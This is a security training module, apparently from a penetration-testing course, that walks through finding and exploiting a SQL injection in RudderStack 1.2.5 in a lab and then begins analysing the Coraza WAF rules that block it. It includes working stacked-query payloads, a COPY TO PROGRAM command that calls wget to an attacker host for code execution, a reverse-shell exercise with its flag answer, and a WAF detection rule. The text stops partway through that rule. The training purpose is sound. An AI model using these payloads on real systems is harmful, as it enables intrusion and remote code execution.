#### RudderStack SQLi and Coraza WAF Bypass
In this Learning Module, we will cover the following Learning Units:

Getting Started
RudderStack SQL Injection Vulnerability
Bypassing a Web Application Firewall
When assessing APIs and web services, it can be difficult to know where to start. Depending on the nature of our assessment, we may have access to documentation and sample API calls. However, even when we have documentation, it is often incomplete or outdated.

In this module, we will analyze the source code of RudderStack to discover API endpoints. After testing which endpoints require authentication, we will discover, analyze, and exploit a SQL injection vulnerability. To make things more interesting, we will then attempt to exploit the same vulnerability through a web application firewall (WAF) and analyze ways to adapt our payload to evade the WAF's rules.

12.1. Getting Started
This Learning Unit covers the following Learning Objectives:

Start and Access the Lab
Using the Lab
In this Learning Module, we'll use the RudderStack VM to discover and exploit the SQL injection vulnerability in the RudderStack application. This Learning Unit will cover how to start, access, and interact with the RudderStack VM.

12.1.1. Accessing the Lab
Let's start the VM below. We should take note of the IP address.

We'll add the IP address to our /etc/hosts file on our Kali Linux VM for easier access to the RudderStack VM and the applications running on the VM.

kali@kali:~$ sudo mousepad /etc/hosts

kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.120.144  rudderstack
Listing 1 - /etc/hosts entries

We can now access the VM by hostname.

Let's note that we've started the RudderStack VM in debug mode. As we'll discuss in the next section, we will have full access to the VM. However, some challenges in this module will require us to start the VM in a different configuration.

Resources
Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

RudderStack - Debug	
12.1.2. Using the Lab
In the following sections, we will present code excerpts from files on the RudderStack VM (rudderstack). We can connect to the RudderStack VM via SSH to inspect any file on the VM.

Alternatively, we can access code-server, a browser-accessible version of Visual Studio Code (VSCode), on port 8000 of the RudderStack VM.

We'll find most of the relevant files on the VM at /home/student. We can access them in code-server by browsing to http://rudderstack:8000/?folder=/home/student. The first time we access the application, we will need to log in.

Figure 1: Accessing code-server
Figure 1: Accessing code-server
We can use the same password provided in the Resources section after we start the machine.

After logging in, we can access the content of /home/student. However, code-server will display a warning message that we are accessing it in an insecure context.

Figure 2: Accessing the files in /home/student with code-server
Figure 2: Accessing the files in /home/student with code-server
If prompted to trust the authors of the files in VSCode, we can click Yes, I trust the authors.

In a production environment, we would not want to expose an application like code-server to the internet this way. However, in a private network, such as our lab environment, exposing code-server with a password is an acceptable level of risk.

The RudderStack VM uses Docker to run RudderStack and OWASP Coraza WAF in containers. We can access RudderStack through the Coraza WAF on port 80. We can also access RudderStack directly on port 8080. We'll be connecting on both ports as we examine how the WAF interacts with the vulnerability.

We can retrieve a list of the running Docker containers by running docker with the ps command.

student@rudder:~$ docker ps
CONTAINER ID   IMAGE                                   COMMAND                  CREATED         STATUS                   PORTS                                                           NAMES
2622443fb04d   student_caddy                           "/usr/bin/caddy run ..."   7 minutes ago   Up 7 minutes             443/tcp, 0.0.0.0:80->80/tcp, :::80->80/tcp, 2019/tcp, 443/udp   student_caddy_1
42363ab7f7ab   rudderlabs/rudder-server:1.2.5          "sh -c '/wait-for db..."   7 minutes ago   Up 7 minutes             0.0.0.0:8080->8080/tcp, :::8080->8080/tcp                       student_backend_1
1b7dd98a3514   rudderstack/rudder-transformer:latest   "/sbin/tini -- npm s..."   7 minutes ago   Up 7 minutes (healthy)   127.0.0.1:9090->9090/tcp                                        student_d-transformer_1
346ffde4eb5c   postgres:15-alpine                      "docker-entrypoint.s..."   7 minutes ago   Up 7 minutes             0.0.0.0:6432->5432/tcp, :::6432->5432/tcp                       student_db_1
d5173efdb8fd   prom/statsd-exporter:v0.22.4            "/bin/statsd_exporter"   7 minutes ago   Up 7 minutes (healthy)   127.0.0.1:9102->9102/tcp, 9125/tcp, 9125/udp                    student_metrics-exporter_1
Listing 2 - Getting a list of the running containers

While there are several containers running, we only need to be aware of student_caddy_1, student_backend_1, and student_db_1 for this module.

If we want to inspect the contents of a container, we can get an interactive session by running docker with the exec command, then -it for an interactive pseudo-TTY session, followed by the container name and the command we want to run. For instance, if we want a shell, we could run the following command:

student@rudder:~$ docker exec -it student_db_1 /bin/sh
/ # 
Listing 3 - Getting an interactive shell on the student_db_1 container

We can close our session in the container with the exit command. The container will continue running after we close our session.

We don't need to be familiar with the details of how Docker or containers work for this Learning Module. However, inspecting the contents of the containers may assist in enumeration while crafting attack payloads.

12.2. RudderStack SQL Injection Vulnerability
This Learning Unit covers the following Learning Objectives:

Perform Code Analysis To Discover Endpoint URLs
Identify SQL Injection Vulnerabilities Through Code Analysis
Build a SQL Injection Payload To Obtain Remote Code Execution
Our VM is running RudderStack v1.2.5, which contains a SQL injection vulnerability identified by the GitHub Security Lab and documented as CVE-2023-30625.

Rather than working off of the CVE write up, we'll perform our own source code analysis to enumerate the application's unauthenticated endpoints and discover the SQL injection vulnerability.

12.2.1. Discovering the SQL Injection Vulnerability
While we have access to the source code for the application, we'll be attacking it as an unauthenticated user. We'll start our analysis by enumerating the available API endpoints and then determining which ones require authentication.

We can find the RudderStack's official API documentation with a basic online search. Based on the documentation, we know that RudderStack uses URL versioning in the endpoint.

Figure 3: RudderStack documentation
Figure 3: RudderStack documentation
If we want to discover all the endpoints in the application's source code, we can search for variations of "/v1", "/v2", and so on.

Let's access just the RudderStack source code in our IDE by browsing to http://rudderstack:8000/?folder=/home/student/rudder-server-1.2.5.

Figure 4: Accessing the RudderStack source code in code-server
Figure 4: Accessing the RudderStack source code in code-server
We'll click on the Search icon in code-server, then click on the ellipsis to toggle additional search details.

Figure 5: Enabling additional search details
Figure 5: Enabling additional search details
We want to find strings that match the expected endpoint format, so we'll type /v1 in the Search field. We'll limit our search to source files by typing *.go in the "files to include" field. We'll exclude any test files, since they will likely contain duplicate results, by typing *_test.go in the "files to exclude" field.

Figure 6: Search results in code-server
Figure 6: Search results in code-server
We have 40 results in 9 files. The first three results contain Sprintf calls that are constructing URL paths. After that, we'll notice multiple results in gateway.go containing strings that appear to be API paths passed to a HandleFunc() function. Let's analyze the start of the StartWebHandler() function, which contains most of the search results in gateway.go.

1417  /*
1418  StartWebHandler starts all gateway web handlers, listening on gateway port.
1419  Supports CORS from all origins.
1420  This function will block.
1421  */
1422  func (gateway *HandleT) StartWebHandler(ctx context.Context) error {
1423  	gateway.logger.Infof("WebHandler waiting for BackendConfig before starting on %d", webPort)
1424  	gateway.backendConfig.WaitForConfig(ctx)
1425  	gateway.logger.Infof("WebHandler Starting on %d", webPort)
1426  
1427  	srvMux := mux.NewRouter()
1428  	srvMux.Use(
1429  		middleware.StatMiddleware(ctx, srvMux),
1430  		middleware.LimitConcurrentRequests(maxConcurrentRequests),
1431  	)
1432  	srvMux.HandleFunc("/v1/batch", gateway.webBatchHandler).Methods("POST")
1433  	srvMux.HandleFunc("/v1/identify", gateway.webIdentifyHandler).Methods("POST")
1434  	srvMux.HandleFunc("/v1/track", gateway.webTrackHandler).Methods("POST")
Listing 4 - Source code excerpt of StartWebHandler() function

Based on the comments, this function starts web handlers. The code registers each endpoint with the HandleFunc() function of the srvMux object, which is an instance of mux.NewRouter(). If we check the import statement at the start of the gateway.go file, we'll find that the code imports github.com/gorilla/mux, a request router and dispatcher. We don't need to understand everything about the gorrila/mux package, but we should be aware that it maps URL paths to handlers. For example, if the application receives a POST request to "/v1/batch", it will pass the request to gateway.webBatchHandler.

Discovering this function gives us a list of URLs to test and helps determine which functions we'll need to review to understand how the application handles the requests. We could review the code for each handler function, but let's send requests through Burp Suite instead. This should provide a faster means of testing which endpoints require authentication.

Let's get the list of potential URLs out of code-server by right-clicking on the search results and selecting Copy All. We'll then paste the results into a text file named routes.txt using our text editor of choice.

Unfortunately, the pasted results include line numbers and source files, so we don't have a clean list of URLs to pass to another tool or script.

kali@kali:~$ head routes.txt
/home/student/rudder-server-1.2.5/cmd/devtool/commands/event.go
  60,24:        url := fmt.Sprintf("%s/v1/batch", c.String("endpoint"))

/home/student/rudder-server-1.2.5/config/backend-config/namespace_config.go
  84,35:        u.Path = fmt.Sprintf("/data-plane/v1/namespaces/%s/config", nc.Namespace)

/home/student/rudder-server-1.2.5/gateway/gateway.go
  989,24:       uri := fmt.Sprintf(`%s/v1/warehouse/pending-events?triggerUpload=true`, misc.GetWarehouseURL())
  1432,21:      srvMux.HandleFunc("/v1/batch", gateway.webBatchHandler).Methods("POST")
  1433,21:      srvMux.HandleFunc("/v1/identify", gateway.webIdentifyHandler).Methods("POST")
Listing 5 - Contents of routes.txt

With some creative use of cut, we can clean up most of the list.

kali@kali:~$ grep -e "/v" routes.txt | cut -d "(" -f 2 | cut -d "," -f 1 | cut -d "\"" -f 2
%s/v1/batch
/data-plane/v1/namespaces/%s/config
`%s/v1/warehouse/pending-events?triggerUpload=true`
/v1/batch
/v1/identify
/v1/track
/v1/page
/v1/screen
/v1/alias
...
Listing 6 - Using cut to remove extraneous data

These results aren't perfect, but they drastically reduce the amount of manual edits we'll need to make. Let's redirect the results to a new file named routes_clean.txt. We'll also sort the results so we can check for duplicate URLs.

kali@kali:~$ grep -e "/v" routes.txt | cut -d "(" -f 2 | cut -d "," -f 1 | cut -d "\"" -f 2 | sort > routes_clean.txt
Listing 7 - Creating a new file with the processed URLs

Next, let's use our text editor of choice to finish adjusting the URLs. We'll remove the backticks. For URLs starting with string format markers (%s) or localhost, we'll remove the initial format markers and localhost URLs so that each line is a relative URL. A few URLs have format markers within the URL path or placeholders (job_run_id). We can replace these values with "web300".

A copy of the file with these changes is available in the Resources section below.

kali@kali:~$ cat routes_clean.txt       
/beacon/v1/batch
/data-plane/v1/namespaces/web300/config
/v1/web300
/pixel/v1/page
/pixel/v1/track
/data-plane/v1/namespaces/web300/settings
/data-plane/v1/workspaces/web300/settings
/v1/batch
/v1/warehouse/pending-events?triggerUpload=true
/v1/alias
/v1/audiencelist
/v1/clear-failed-events
/v1/failed-events
/v1/group
/v1/identify
/v1/import
/v1/job-status
/v1/job-status/web300
/v1/job-status/web300/failed-records
/v1/merge
/v1/page
/v1/pending-events
/v1/process
/v1/screen
/v1/setConfig
/v1/track
/v1/warehouse
/v1/warehouse/jobs
/v1/warehouse/jobs/status
/v1/warehouse/pending-events
/v1/warehouse/trigger-upload
/v1/webhook
Listing 8 - Contents of routes_clean.txt after manual changes

Now that we have our list, we'll use Burp Suite to send requests to every endpoint. After opening Burp Suite, let's open the embedded browser and navigate to http://rudderstack:8080/ so that we have a request that we can send to Intruder.

Figure 7: Initial request in Intruder
Figure 7: Initial request in Intruder
We want to send a request to each endpoint, so we'll need to add a payload marker over the forward slash on line one of the request. If we recall from Listing 4, each route also has an associated HTTP method. If we send a GET request to an endpoint that only handles POST requests, we might miss a valid API call. At the same time, fuzzing API endpoints with unexpected HTTP methods could also help us discover edge cases or bugs in the system. For those reasons, we'll also add a payload marker over "GET" on line one.

Figure 8: Intruder configured with two positions
Figure 8: Intruder configured with two positions
For our attack type, we'll select Cluster bomb. We want to test all combinations of HTTP methods and URL paths. Let's move on to configuring the Payloads.

For payload set 1, we can use a "Simple list". We'll add "GET" and "POST" to the list.

Figure 9: Intruder setup for payload set one
Figure 9: Intruder setup for payload set one
For payload set 2, we'll also use a "Simple list". Let's click on Load..., then select routes_clean.txt. We want the slashes in our payload list to be sent as-is, rather than URL-encoded, so we'll need to scroll down and uncheck "URL-encode these characters".

Figure 10: Intruder setup for payload set two
Figure 10: Intruder setup for payload set two
With everything set, we're ready to click Start attack. Burp Suite will open a new window with the results of our attack.

The Community Edition of Burp Suite restricts some of Intruder's functionality. However, none of the restrictions will affect us and we can click Ok when presented with the pop-up.

Using the built-in sorting options in Intruder attack results is a good way for us to analyze the results and identify differences and similarities in the responses. Let's sort the results ascending by status code. One of the first results is an HTTP 400 response for a POST request to /v1/warehouse/pending-events?triggerUpload=true.

Figure 11: Intruder results sorted by status code
Figure 11: Intruder results sorted by status code
The response body is "can't unmarshall body". This is interesting since unmarshalling is the process of converting data from one format to another, such as XML to an in-memory object. Let's make note of this request and response and send the request to Repeater for further testing.

Most of the other responses are 404s or include some variation of "Failed to read writeKey". This latter message may be tied to an API key or some form of authentication. If we sort the Intruder results by Length, we'll find six responses with a length of 195 that all include "can't unmarshall body" in the response.

Figure 12: Intruder results sorted by length
Figure 12: Intruder results sorted by length
Let's send all six to Repeater so that we can keep track of them if we close the Intruder window.

Our next step is to review the application's source code to determine what content-type we need to send on these requests. We'll return to our IDE and review gateway.go.

1462  srvMux.HandleFunc("/v1/pending-events", WithContentType("application/json; charset=utf-8", gateway.pendingEventsHandler)).Methods("POST")
1463  srvMux.HandleFunc("/v1/failed-events", WithContentType("application/json; charset=utf-8", gateway.fetchFailedEventsHandler)).Methods("POST")
1464  srvMux.HandleFunc("/v1/warehouse/pending-events", gateway.whProxy.ServeHTTP).Methods("POST")
1465  srvMux.HandleFunc("/v1/clear-failed-events", gateway.clearFailedEventsHandler).Methods("POST")
Listing 9 - Source code excerpt of StartWebHandler() function

Line 1464 doesn't declare a content type for the /v1/warehouse/pending-events handler, unlike lines 1462 and 1463, which set the expected content type as JSON. Since the majority of the other endpoints use JSON, we can try modifying our request to send JSON.

In Repeater, let's add "Content-Type: application/json" to our request, a placeholder JSON body, and then click Send.

Figure 13: Response in Repeater with 
Figure 13: Response in Repeater with "empty source id"
This time the application responded with "empty source id". Let's search for that string in our IDE.

Figure 14: Search results in code-server
Figure 14: Search results in code-server
We receive three results in two files. The results in warehouse.go seem promising, as one of them includes "pending-events". Let's click on the second result and analyze the source code.

1673	// unmarshall body
1674	var pendingEventsReq warehouseutils.PendingEventsRequestT
1675	err = json.Unmarshal(body, &pendingEventsReq)
1676	if err != nil {
1677		pkgLogger.Errorf("[WH]: Error unmarshalling body: %v", err)
1678		http.Error(w, "can't unmarshall body", http.StatusBadRequest)
1679		return
1680	}
1681  
1682	sourceID := pendingEventsReq.SourceID
1683
1684	// return error if source id is empty
1685	if sourceID == "" {
1686		pkgLogger.Errorf("[WH]: pending-events:  Empty source id")
1687		http.Error(w, "empty source id", http.StatusBadRequest)
1688		return
1689	}
Listing 10 - Source excerpt from warehouse.go

We've found the two error messages we've received so far. Line 1682 defines the sourceID variable. Since our request does not contain the necessary value, the if statement on line 1685 evaluates as true and we receive the error message from line 1687.

We need to determine the proper value we need to include in our JSON body to control the value of pendingEventsReq.SourceID. The code declares the type of pendingEventsReq as warehouseutils.PendingEventsRequestT on line 1674.

If we search in our IDE for "PendingEventsRequestT", we can find it declared as a struct in warehouse/utils/utils.go on lines 321 through 324.

321  type PendingEventsRequestT struct {
322    SourceID  string `json:"source_id"`
323    TaskRunID string `json:"task_run_id"`
324  }
Listing 11 - Definition of PendingEventsRequestT

Based on this source code, we'll need to include source_id and task_run_id in the JSON body. Let's return to Repeater in Burp Suite and update our request body to include these keys. We'll set the value of each to "1" for now. After updating the request, let's click Send.

Figure 15: Repeater with 200 OK response
Figure 15: Repeater with 200 OK response
The application responded with HTTP 200 OK, meaning we were able to call the API endpoint without authentication. Let's return to our IDE to determine what we can do with this endpoint. We'll continue analyzing the pendingEventsHandler() function in warehouse.go, starting on line 1691.

1691  pendingEvents := false
1692  var pendingStagingFileCount int64
1693  var pendingUploadCount int64
1694  
1695  // check whether there are any pending staging files or uploads for the given source id
1696  // get pending staging files
1697  pendingStagingFileCount, err = getPendingStagingFileCount(sourceID, true)
1698  if err != nil {
1699      err := fmt.Errorf("error getting pending staging file count : %v", err)
1700      pkgLogger.Errorf("[WH]: %v", err)
1701      http.Error(w, err.Error(), http.StatusInternalServerError)
1702      return
1703  }
Listing 12 - Source excerpt from warehouse.go

Line 1697 passes the sourceID value to the getPendingStagingFileCount() function. We can find that function starting on line 1777 in the same file.

1777  func getPendingStagingFileCount(sourceOrDestId string, isSourceId bool) (fileCount int64, err error) {
1778      sourceOrDestColumn := ""
1779      if isSourceId {
1780          sourceOrDestColumn = "source_id"
1781      } else {
1782          sourceOrDestColumn = "destination_id"
1783      }
1784      var lastStagingFileIDRes sql.NullInt64
1785      sqlStatement := fmt.Sprintf(`
1786          SELECT 
1787            MAX(end_staging_file_id) 
1788          FROM 
1789            %[1]s 
1790          WHERE 
1791            %[1]s.%[3]s = '%[2]s';
1792  `,
1793          warehouseutils.WarehouseUploadsTable,
1794          sourceOrDestId,
1795          sourceOrDestColumn,
1796      )
1797  
1798      err = dbHandle.QueryRow(sqlStatement).Scan(&lastStagingFileIDRes)
Listing 13 - Code excerpt from getPendingStagingFileCount() function

This creates a SQL statement on lines 1785 through 1796, using Sprintf(). The function writes the sourceOrDestId value into the SQL statement. While this string formatting approach may seem similar to a parameterized query, it is not, and does not offer any of the protections against SQL injection. The code creates the sqlStatement, inserting the user-supplied value in the sourceOrDestId in the WHERE clause. Line 1798 then executes the SQL statement. Since the code writes the variables on lines 1793 through 1795 into the sqlStatement through string formatting, they are not passed as parameters to the dbHandle.QueryRow() function.

Since we can control the value of sourceOrDestId from our unauthenticated request, we should be able to exploit this SQL injection vulnerability. We'll explore the exploitation technique in the next section.

Resources
Some of the labs require you to download the file(s) below.

routes_clean.txt	
12.2.2. Exploiting the SQL Injection Vulnerability
In the previous section, we identified that the application takes the source_id value sent to the /v1/warehouse/pending-events endpoint and writes it into a SQL statement. The application does not use a parameterized query. It does not attempt to encode, remove, or replace potentially dangerous characters, such as single quotes, on the source_id value. We should be able to exploit the SQL injection vulnerability.

Let's verify that we can manipulate the SQL query. In Repeater, we'll update the source_id value to include a single quote and then Send the request.

Figure 16: Repeater with 500 Internal Server Error response
Figure 16: Repeater with 500 Internal Server Error response
The application responded with an error message which contains the SQL statement and pq: unterminated quoted string at or near "''';". This error message confirms that we can manipulate the SQL query and the application is therefore vulnerable to SQL injection.

Since we have access to the source code, we can easily determine that the application uses PostgreSQL by reviewing the setupDB() function, which starts on line 2066 of warehouse.go. We could also consult the application's online documentation. In a black box assessment scenario, we could research the error message online to determine the database.

Since our injection point is at the end of the SQL statement and we are dealing with a PostgreSQL database, let's try injecting a stacked query. We'll attempt to create a valid stacked query so that the application does not return an error. With that in mind, we'll update the source_id value to 1; select 2 FROM wh_uploads; -- -, and then Send the request.

Figure 17: Repeater with 200 OK response
Figure 17: Repeater with 200 OK response
The application responded with HTTP 200 OK. Since there wasn't an error in the response, we can assume that the database executed our second query.

Now that we've confirmed the SQL injection vulnerability, we need to decide how to use it. Let's take a moment to consider PostgreSQL's COPY command. It can copy data to or from a local file if the database user has the pg_read_server_files or pg_write_server_files roles. While reading or writing files won't help us in this situation, it can be very useful if the web application and database share a server.

The COPY command can also copy data to or from a program or command if the database user has the pg_execute_server_program role. If the exploited database user has this permission, we have many options available for remote code execution. In a black box assessment, we may need to use trial and error to determine which permissions the database user has. Verbose error messages may also disclose when an injection payload fails due to a lack of permissions.

Let's try using COPY to call wget and send a request back to our VM. First, we'll set up an HTTP server with Python to handle the request.

kali@kali:~$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
Listing 14 - Starting an HTTP server with Python

Next, we'll update the source_id in Repeater to '; copy (select 'a') to program 'wget -q http://192.168.48.2:9000/it_worked' -- - and then Send the request.

Figure 18: Repeater with 500 Internal Error Response
Figure 18: Repeater with 500 Internal Error Response
The application responded with an error, indicating that wget failed. However, if we check our HTTP server, the server did send a request.

kali@kali:~$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
192.168.120.144 - - [29/Feb/2024 15:26:01] code 404, message File not found
192.168.120.144 - - [29/Feb/2024 15:26:01] "GET /it_worked HTTP/1.1" 404 -
Listing 15 - Request from vulnerable server

Excellent. We were able to use the SQL injection vulnerability to run a command on the server. From here, we should be able to get a reverse shell on the server.

For more ways to exploit SQL injection with PostgreSQL, refer to the ManageEngine Applications Manager AMUserResourcesSyncServlet SQL Injection RCE Learning Module.

Resources
Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

RudderStack - Exercise	
Labs
Using the RudderStack - Exercise VM, exploit the SQL injection vulnerability and get a reverse shell. The flag is located in /flag.txt.
Answer
OS{5633f99f32eb3442f2adc997bc79943b}
12.3. Bypassing a Web Application Firewall
This Learning Unit covers the following Learning Objectives:

Understand the Basic Concepts of a Web Application Firewall
Analyze Web Application Firewall Rules To Find Bypasses
Build a SQL Injection Payload To Bypass a Web Application Firewall
After performing a web application assessment and identifying vulnerabilities, we may be asked if there are compensating controls or other mitigations for the vulnerabilities. For example, we may have performed the assessment in a non-production environment with fewer controls, such as a web application firewall (WAF). A WAF protects a web application by monitoring traffic with a set of predefined rules. Most WAFs will block traffic that violates a rule, preventing the potentially-malicious traffic from reaching the web application.

Developers may also attempt to create a virtual patch for a vulnerability using custom WAF rules. This approach allows developers to quickly protect an application without modifying the application's code or redeploying it. However, virtual patches are a temporary solution, or a part of defense in depth.

In this Learning Unit, we will attempt to exploit the same SQL injection vulnerability through a WAF. This will require us to update our payload to evade the WAF rules.

12.3.1. What is a WAF?
WAFs are similar to network firewalls, but designed to work specifically with web applications and HTTP(S) traffic. In other words, WAFs operate on the application layer (7) of the OSI model, while regular firewalls typically operate on the network layer (3). WAFs inspect HTTP traffic and compare it against a rule set of keywords and regular expressions. If the WAF finds a match, it blocks the request. Some WAFs can be configured to replace dangerous characters instead of blocking the request.

If the WAF determines a request is safe (or the WAF has sanitized the request), it forwards the request to the upstream web application. Some WAFs will also inspect the return traffic the web application sends back to the requester. In this role, WAFs can assist with data loss prevention or apply additional security headers, such as Content Security Policy (CSP), X-Frame-Options, or standardized CORS headers.

A WAF might also implement rate limiting or block IP addresses based on what it deems suspicious behavior. Depending on the nature of our web application assessment, we may need to throttle automated activity to evade these restrictions. However, we don't need to worry about this in our lab environment.

12.3.2. Getting Started with Coraza WAF
Our lab environment includes a container running Caddy with the OWASP Coraza module. Coraza is preconfigured with the ModSecurity Core Rule Set (CRS) ruleset.

The RudderStack VM needs to be running in debug mode to follow along with the examples in this Learning Unit.

We can review the log files for Caddy and Coraza using the docker logs command, followed by the container name. This command will display all logs from the container, which can often be overwhelming. We can limit the number of lines displayed by using the -n option with an integer value.

student@rudder:~$ docker logs -n 5 student_caddy_1
{"level":"info","ts":1709234331.2088175,"msg":"autosaved config (load with --resume flag)","file":"/config/caddy/autosave.json"}
{"level":"info","ts":1709234331.208909,"msg":"serving initial configuration"}
{"level":"info","ts":1709234331.2088883,"logger":"tls","msg":"cleaning storage unit","storage":"FileStorage:/data/caddy"}
{"level":"info","ts":1709234331.2092092,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1709234331.2136114,"logger":"watcher","msg":"watching config file for changes","config_file":"/coraza/Caddyfile"}
student@rudder:~$ 
Listing 16 - Retrieving five lines from the Caddy logs

In a black box assessment, we wouldn't have access to log files like this. However, testing a WAF in a controlled environment will help us to understand how rules are applied. We'll need this knowledge to develop a payload that will evade WAF rules in our lab environment. In turn, this will help us apply our knowledge during future web application assessments where we don't have full access to the servers or log files.

Resources
Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

RudderStack - Debug	
12.3.3. Triggering the WAF
Let's try sending our SQL injection payload through the WAF. As a reminder, we're using the following JSON body as our proof of concept:

{ "source_id":"'; copy (select 'a') to program 'wget -q http://192.168.48.3:9000/it_worked' -- - ", "task_run_id":"1"}
Listing 17 - SQL injection payload

If we still have our request in Repeater, we can update the Target and Host values to use port 80. Once we've updated the request, we can Send it.

Figure 19: Repeater with 403 Forbidden response
Figure 19: Repeater with 403 Forbidden response
The application responded with HTTP 403 Forbidden with a Content-Length of 0. This response does not give us a lot to work with. Checking for different responses based on the values we send is one way we can attempt to identify if an application is behind a WAF. For example, if we send a single quote as the source_id, the application responds with an HTTP 500 Internal Server Error with the verbose error message.

Figure 20: Repeater with 500 Internal Server Error response
Figure 20: Repeater with 500 Internal Server Error response
However, if we include a single quote followed by a semicolon (';), we receive the empty 403 Forbidden response. This difference in response may be all that we have to identify that we're interacting with a WAF.

Since we do have full access to the testing environment, let's review the Caddy logs to determine which rule we triggered.

student@rudder:~$ docker logs -n 5 student_caddy_1
{"level":"debug","ts":1709242735.4946961,"logger":"http.handlers.reverse_proxy","msg":"selected upstream","dial":"backend:8080","total_upstreams":1}
{"level":"debug","ts":1709242735.4958072,"logger":"http.handlers.reverse_proxy","msg":"upstream roundtrip","upstream":"backend:8080","duration":0.001060348,"request":{"remote_ip":"192.168.48.2","remote_port":"61683","client_ip":"192.168.48.2","proto":"HTTP/1.1","method":"POST","host":"rudderstack:80","uri":"/v1/warehouse/pending-events?triggerUpload=true","headers":{"Content-Length":["42"],"Accept-Encoding":["gzip, deflate, br"],"X-Forwarded-For":["192.168.48.2"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36"],"Accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],"X-Forwarded-Proto":["http"],"Upgrade-Insecure-Requests":["1"],"Content-Type":["application/json"],"Accept-Language":["en-US,en;q=0.9"],"X-Forwarded-Host":["rudderstack:80"]}},"headers":{"Vary":["Origin"],"X-Content-Type-Options":["nosniff"],"Content-Length":["227"],"Content-Type":["text/plain; charset=utf-8"],"Date":["Thu, 29 Feb 2024 21:38:55 GMT"]},"status":500}
{"level":"error","ts":1709242946.2066061,"logger":"http.handlers.waf","msg":"[client \"192.168.48.2\"] Coraza: Warning. SQL Authentication bypass (split query) [file \"/ruleset/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf\"] [line \"9227\"] [id \"942540\"] [rev \"\"] [msg \"SQL Authentication bypass (split query)\"] [data \"Matched Data: '; found within ARGS:json.source_id: ';\"] [severity \"critical\"] [ver \"OWASP_CRS/4.0.1-dev\"] [maturity \"0\"] [accuracy \"0\"] [tag \"application-multi\"] [tag \"language-multi\"] [tag \"platform-multi\"] [tag \"attack-sqli\"] [tag \"OWASP_CRS\"] [tag \"capec/1000/152/248/66\"] [tag \"PCI/6.5.2\"] [tag \"paranoia-level/1\"] [hostname \"\"] [uri \"/v1/warehouse/pending-events?triggerUpload=true\"] [unique_id \"DqHmPboMoGeARJPm\"]"}
{"level":"error","ts":1709242946.2070546,"logger":"http.handlers.waf","msg":"[client \"192.168.48.2\"] Coraza: Access denied (phase 2). Inbound Anomaly Score Exceeded (Total Score: 5) [file \"/ruleset/rules/REQUEST-949-BLOCKING-EVALUATION.conf\"] [line \"11422\"] [id \"949110\"] [rev \"\"] [msg \"Inbound Anomaly Score Exceeded (Total Score: 5)\"] [data \"\"] [severity \"emergency\"] [ver \"OWASP_CRS/4.0.1-dev\"] [maturity \"0\"] [accuracy \"0\"] [tag \"anomaly-evaluation\"] [hostname \"\"] [uri \"/v1/warehouse/pending-events?triggerUpload=true\"] [unique_id \"DqHmPboMoGeARJPm\"]"}
{"level":"debug","ts":1709242946.2072287,"logger":"http.log.error","msg":"interruption triggered","request":{"remote_ip":"192.168.48.2","remote_port":"61800","client_ip":"192.168.48.2","proto":"HTTP/1.1","method":"POST","host":"rudderstack:80","uri":"/v1/warehouse/pending-events?triggerUpload=true","headers":{"Accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],"Accept-Language":["en-US,en;q=0.9"],"Upgrade-Insecure-Requests":["1"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36"],"Accept-Encoding":["gzip, deflate, br"],"Connection":["keep-alive"],"Content-Type":["application/json"],"Content-Length":["43"]}},"duration":0.003618809,"status":403,"err_id":"DqHmPboMoGeARJPm","err_trace":""}
student@rudder:~$ 
Listing 18 - Checking the Caddy logs

The logs indicate our attack triggered the "SQL Authentication bypass (split query)" rule, which can be found in /ruleset/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf. We'll analyze this file in the next section to understand how the rule works.

12.3.4. Analyzing the WAF Ruleset
We can find REQUEST-942-APPLICATION-ATTACK-SQLI.conf in /home/student/caddy/ruleset/rules/. To review the file in code-server, we can browse to http://rudderstack:8000/?folder=/home/student/caddy and open the relevant directories. After searching for "SQL Authentication bypass (split query)", we can find the relevant rule starting on line 547.

# This rule catches an authentication bypass via SQL injection that abuses semi-colons to end the SQL query early.
# Any characters after the semi-colon are ignored by some DBMSes (e.g. SQLite).
#
# An example of this would be:
#   email=admin%40juice-sh.op';&password=foo
#
# The server then turns this into:
#   SELECT * FROM users WHERE email='admin@juice-sh.op';' AND password='foo'
#
# Regular expression generated from regex-assembly/942540.ra.
# To update the regular expression run the following shell script
# (consult https://coreruleset.org/docs/development/regex_assembly/ for details):
#   crs-toolchain regex update 942540
#
SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "@rx ^(?:[^']*'|[^\"]*\"|[^`]*`)[\s\v]*;" \
    "id:942540,\
    phase:2,\
    block,\
    capture,\
    t:none,t:urlDecodeUni,t:replaceComments,\
    msg:'SQL Authentication bypass (split query)',\
    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-sqli',\
    tag:'OWASP_CRS',\
    tag:'capec/1000/152/248/66',\
    tag:'PCI/6.5.2',\
    tag:'paranoia-level/1',\
    ver:'OWASP_CRS/4.0.0-rc2',\
    severity:'CRITICAL',\
